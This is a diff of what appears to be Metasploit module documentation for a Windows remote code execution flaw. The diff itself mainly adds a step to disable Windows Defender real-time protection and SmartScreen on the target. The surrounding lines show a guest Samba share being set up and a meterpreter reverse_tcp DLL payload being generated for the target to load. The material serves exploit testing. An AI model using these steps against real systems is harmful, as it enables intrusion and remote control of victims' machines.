@@ -15,14 +15,14 @@ request, resulting in remote code execution as NT AUTHORITY\SYSTEM.
     1. `sudo cp -pf /etc/samba/smb.conf /etc/samba/smb.conf.bak` to backup your existing config.
     1. `sudo mkdir /var/public`
     1. Add the following into the end of the `/etc/samba/smb.conf` file:
-    
+
         ```
         [public]
         comment = Public Directories
         path = /var/public
         guest ok = Yes
         ```
-       
+
     1. Restart Samba with `sudo service smbd restart`.
 1. Generate your DLL and place the file under `/var/public`.
 
@@ -50,6 +50,10 @@ request, resulting in remote code execution as NT AUTHORITY\SYSTEM.
     [*] Writing 8704 bytes to /home/gwillcox/payload.dll...
     msf6 payload(windows/x64/meterpreter/reverse_tcp) > sudo mv /home/gwillcox/payload.dll /var/public/payload.dll
     ```
+
+1. Disable Windows security options on the target
+    1. Disable Windows Defender Real-time protection (Windows Security > Virus & threat protection > Virus & threat protection settings)
+    1. Disable Windows Defender SmartScreen (Windows Security > Virus & threat protection > App & browser control)
 
 1. Exploit the vulnerability to force the target to load the DLL payload
     1. From msfconsole
